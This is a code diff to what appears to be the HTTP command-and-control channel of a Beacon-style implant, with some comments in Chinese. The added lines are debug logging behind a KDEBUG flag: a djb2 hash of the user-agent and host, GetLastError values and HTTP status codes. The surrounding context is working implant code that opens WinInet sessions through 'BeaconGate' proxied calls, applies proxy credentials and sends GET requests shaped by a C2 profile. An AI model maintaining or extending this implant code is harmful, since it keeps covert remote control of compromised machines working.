@@ -62,6 +62,19 @@ static DWORD_PTR dummyContext; /* 一个虚拟上下文对象 */
 
 #define MAX_HTTP_POST (1024 * 1024 * 2)
 
+/* KDEBUG bring-up probe: djb2 of a string, to compare what we hand WinInet
+ * with what it kept. */
+#if defined(KDEBUG)
+static long http_sum(const char * s) {
+	unsigned long v = 5381;
+	if (s == NULL)
+		return 0;
+	for (; *s; s++)
+		v = v * 33u + (unsigned char)*s;
+	return (long)v;
+}
+#endif
+
 void http_init(char * host, int port, char * ua) {
 	unsigned long timeout = 240000;
 
@@ -91,7 +104,10 @@ void http_init(char * host, int port, char * ua) {
 				break;
 		}
 		/* BeaconGate: proxied when on for InternetOpenA */
+		KD("http: ua sum=", http_sum(ua));
+		KD("http: host sum=", http_sum(host));
 		session_h = gate_InternetOpenA(ua, acctype, proxy, NULL, 0);
+		KD("http: session gle=", (long)GetLastError());
 	}
 
 	/* 4 minute timeout... this is fair I think; unless you're hacking someone on dialup. Then you're in trouble :P~
@@ -111,6 +127,18 @@ void http_init(char * host, int port, char * ua) {
 		strncpy(http_current_host, host, sizeof(http_current_host) - 1);
 	/* BeaconGate: proxied when on for InternetConnectA */
 	connect_h = gate_InternetConnectA(session_h, host, (INTERNET_PORT)port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
+	KD("http: connect gle=", (long)GetLastError());
+#if defined(KDEBUG)
+	{
+		char probe[256];
+		DWORD plen = sizeof(probe);
+		memset(probe, 0, sizeof(probe));
+		if (InternetQueryOptionA(session_h, INTERNET_OPTION_USER_AGENT, probe, &plen))
+			KD("http: wininet ua sum=", http_sum(probe));
+		else
+			KD("http: wininet ua gle=", (long)GetLastError());
+	}
+#endif
 
 	/* 如果我们有凭据，立即将它们分配给这个连接 */
 	if (setting_short(SETTING_PROXY_BEHAVIOR) == PROXYB_MANUAL_CREDS) {
@@ -174,11 +202,13 @@ BOOL http_request_isOK(HINTERNET request) {
 
 	if (!HttpQueryInfoA(request, HTTP_QUERY_STATUS_CODE, &responseText, &responseTextSize, NULL)) {
 		// dlog("channel.http_request_isOK - HttpQueryInfoA failed \n");
+		KD("ch: qinfo gle=", (long)GetLastError());
 		return FALSE;
 	}
 
 	/* 检查实际的HTTP返回码 */
 	statusCode = atoi(responseText);
+	KD("ch: status=", (long)statusCode);
 	// dlog("channel.http_request_isOK - statusCode : %d \n", statusCode);
 	if (statusCode != 200) {
 		return FALSE;
@@ -316,8 +346,11 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 	/* 打开请求 */
 	// dlog("channel._http_get - Opening and sending request for uri: %s \n", myuri);
 	request = HttpOpenRequestA(connect_h, setting_ptr(SETTING_C2_VERB_GET), myuri, NULL, NULL, accept, httpflags, dummyContext);
+	KD("ch: open gle=", (long)GetLastError());
+	KD("ch: open req=", (long)(request != NULL));
 	fixRequest(request);
-	HttpSendRequestA(request, myprofile.headers, strlen(myprofile.headers), myprofile.buffer, myprofile.blen);
+	KD("ch: send ok=", (long)HttpSendRequestA(request, myprofile.headers, strlen(myprofile.headers), myprofile.buffer, myprofile.blen));
+	KD("ch: send gle=", (long)GetLastError());
 
 	/* 配置文件使用完毕，释放它 */
 	profile_free(&myprofile, meta->length);
